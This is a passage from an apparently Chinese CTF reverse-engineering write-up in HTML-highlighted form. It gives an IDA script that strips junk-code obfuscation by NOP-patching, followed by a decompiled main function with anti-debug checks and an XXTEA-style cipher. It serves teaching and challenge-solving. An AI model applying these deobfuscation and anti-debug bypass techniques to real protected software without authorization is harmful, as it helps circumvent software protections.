operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> v <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">==</span> <span class=\"token number\">0x5153509C</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 搜索最后的jmp rax指令</span>\n<span class=\"token keyword\">static</span> <span class=\"token function\">FindJmpRax</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> v <span class=\"token operator\">=</span> <span class=\"token function\">Word</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">==</span> <span class=\"token number\">0xE0FF</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 搜索call $+5</span>\n<span class=\"token keyword\">static</span> <span class=\"token function\">FindCall</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> v <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">==</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> StartAddr <span class=\"token operator\">=</span> <span class=\"token number\">0x1401F400D</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 搜索真实汇编代码的下一个指令地址</span>\n        <span class=\"token keyword\">auto</span> EndAddr <span class=\"token operator\">=</span> <span class=\"token function\">FindEnd</span><span class=\"token punctuation\">(</span>StartAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>EndAddr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// 真实汇编代码的字节长度</span>\n        <span class=\"token keyword\">auto</span> CodeLength <span class=\"token operator\">=</span> EndAddr <span class=\"token operator\">-</span> addr <span class=\"token operator\">-</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 搜索Call $+5</span>\n        <span class=\"token keyword\">auto</span> CallAddr <span class=\"token operator\">=</span> <span class=\"token function\">FindCall</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">+</span> CodeLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>CallAddr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// call $+5的下一条指令地址，即call时push到栈的返回地址</span>\n        <span class=\"token keyword\">auto</span> CalcAddr <span class=\"token operator\">=</span> CallAddr <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> ebx <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>CalcAddr <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> rol_Value <span class=\"token operator\">=</span> <span class=\"token function\">Byte</span><span class=\"token punctuation\">(</span>CalcAddr <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> Mode <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>CalcAddr <span class=\"token operator\">+</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ebx <span class=\"token operator\">=</span> <span class=\"token function\">rol</span><span class=\"token punctuation\">(</span>ebx<span class=\"token punctuation\">,</span> rol_Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// 搜索最尾部的jmp rax指令地址</span>\n        <span class=\"token keyword\">auto</span> JmpRaxAddr <span class=\"token operator\">=</span> <span class=\"token function\">FindJmpRax</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>JmpRaxAddr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// 第一部分垃圾指令长度</span>\n        <span class=\"token keyword\">auto</span> TrushCodeLength_1 <span class=\"token operator\">=</span> CallAddr <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">+</span> CodeLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 第二部分垃圾指令长度</span>\n        <span class=\"token keyword\">auto</span> TrushCodeLength_2 <span class=\"token operator\">=</span> JmpRaxAddr <span class=\"token operator\">-</span> CallAddr <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Nop掉无用的所有代码</span>\n        <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>CallAddr<span class=\"token punctuation\">,</span> TrushCodeLength_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">+</span> CodeLength<span class=\"token punctuation\">,</span> TrushCodeLength_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 一共两种地址计算，加和减</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Mode <span class=\"token operator\">==</span> <span class=\"token number\">0xffC32B48</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            CalcAddr <span class=\"token operator\">=</span> CalcAddr <span class=\"token operator\">-</span> ebx<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Mode <span class=\"token operator\">==</span> <span class=\"token number\">0xffC30348</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            CalcAddr <span class=\"token operator\">=</span> CalcAddr <span class=\"token operator\">+</span> ebx<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">auto</span> JmpCodeAddr <span class=\"token operator\">=</span> EndAddr<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 计算相对跳转地址</span>\n        <span class=\"token keyword\">auto</span> JmpOffset <span class=\"token operator\">=</span> CalcAddr <span class=\"token operator\">-</span> JmpCodeAddr <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 写入jmp指令</span>\n        <span class=\"token function\">PatchByte</span><span class=\"token punctuation\">(</span>JmpCodeAddr<span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">PatchDword</span><span class=\"token punctuation\">(</span>JmpCodeAddr <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> JmpOffset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// jmp的地址为下一次deobf起始地址</span>\n        addr <span class=\"token operator\">=</span> CalcAddr<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>执行完，把main_0剩余代码都手动nop即可。</p>\n<p><img src=\"/images/44-1744626745338-49.png\" loading=\"lazy\"></p>\n<p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p>\n<p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p>\n<p><img src=\"/images/45-1744626745338-50.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/46-1744626745338-51.png\" loading=\"lazy\"></p>\n<p>Main函数原代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main_0</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbp</span>\n  __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n  __int64 i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rcx</span>\n  _DWORD <span class=\"token operator\">*</span>v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n  HANDLE CurrentProcess<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n  __int64 v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp-20h] [rbp-458h] BYREF</span>\n  _DWORD v10<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-438h] BYREF</span>\n  _BYTE v11<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-430h] BYREF</span>\n  _BYTE <span class=\"token operator\">*</span>v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+48h] [rbp-3F0h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+64h] [rbp-3D4h]</span>\n  <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+84h] [rbp-3B4h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+A4h] [rbp-394h]</span>\n  <span class=\"token keyword\">int</span> v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+C4h] [rbp-374h]</span>\n  <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+E4h] [rbp-354h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+104h] [rbp-334h]</span>\n  <span class=\"token keyword\">int</span> v19<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+124h] [rbp-314h]</span>\n  <span class=\"token keyword\">int</span> v20<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+144h] [rbp-2F4h]</span>\n  <span class=\"token keyword\">int</span> v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+164h] [rbp-2D4h]</span>\n  _DWORD v22<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+188h] [rbp-2B0h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> __int16 v23<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1B4h] [rbp-284h]</span>\n  BOOL v24<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1D4h] [rbp-264h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> __int64 j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1F8h] [rbp-240h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v26<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+218h] [rbp-220h]</span>\n  _DWORD v27<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+238h] [rbp-200h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 m<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+268h] [rbp-1D0h]</span>\n  <span class=\"token keyword\">int</span> v29<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+3F4h] [rbp-44h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v30<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+3F8h] [rbp-40h]</span>\n  <span class=\"token keyword\">int</span> v31<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+3FCh] [rbp-3Ch]</span>\n  __int64 v32<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+400h] [rbp-38h]</span>\n  <span class=\"token keyword\">int</span> v33<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+408h] [rbp-30h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v34<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+410h] [rbp-28h]</span>\n  __int64 v35<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+428h] [rbp-10h]</span>\n  __int64 v36<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+430h] [rbp-8h]</span>\n\n  v36 <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span>\n  v35 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span>\n  v7 <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">170</span><span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">;</span> <span class=\"token operator\">--</span>i <span class=\"token punctuation\">)</span>\n    <span class=\"token operator\">*</span>v7<span class=\"token operator\">++</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">858993460</span><span class=\"token punctuation\">;</span>\n  v34 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>v10 <span class=\"token operator\">^</span> <span class=\"token number\">0x1401D9000LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">j___CheckForDebuggerJustMyCode</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401ED104LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v11<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_140087C02</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401A1190LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">IsDebuggerPresent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">sub_1400868E3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v12 <span class=\"token operator\">=</span> v11<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v22<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v23 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    v29 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    v20 <span class=\"token operator\">=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    v15 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v16 <span class=\"token operator\">=</span> <span class=\"token number\">0x61C88646</span><span class=\"token punctuation\">;</span>\n    v21 <span class=\"token operator\">=</span> <span class=\"token number\">0x95664B48</span><span class=\"token punctuation\">;</span>\n    v19 <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    v24 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    CurrentProcess <span class=\"token operator\">=</span> <span class=\"token function\">GetCurrentProcess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">CheckRemoteDebuggerPresent</span><span class=\"token punctuation\">(</span>CurrentProcess<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v24<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v24 <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">j_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xAABBu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span>\n        v22<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">j_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        v29 <span class=\"token operator\">=</span> v19<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n        v30 <span class=\"token operator\">=</span> v29 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v30 <span class=\"token punctuation\">)</span>\n          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        v15 <span class=\"token operator\">+=</span> v16<span class=\"token punctuation\">;</span>\n        v17 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v15 <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> v23<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>k <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n          v26 <span class=\"token operator\">=</span> <span class=\"token function\">__rdtsc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          v13 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n          v29 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> v13<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> v23 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          v30 <span class=\"token operator\">=</span> k <span class=\"token operator\">+</span> v23 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n          v31 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v30 <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v13 <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v29<span class=\"token punctuation\">;</span>\n          v32 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>v17 <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n          v33 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v30 <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> v22<span class=\"token punctuation\">[</span>v32<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v13 <span class=\"token operator\">^</span> v15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v31<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n          <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v33<span class=\"token punctuation\">;</span>\n          v14 <span class=\"token operator\">=</span> v33<span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">__rdtsc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> v26 <span class=\"token operator\">></span> <span class=\"token number\">0x83C0</span> <span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">goto</span> LABEL_20<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xA9934E2F</span><span class=\"token punctuation\">;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x30B90FA</span><span class=\"token punctuation\">;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xDCBF1D3</span><span class=\"token punctuation\">;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x328B5BDE</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> m <span class=\"token operator\">=</span> <span class=\"token 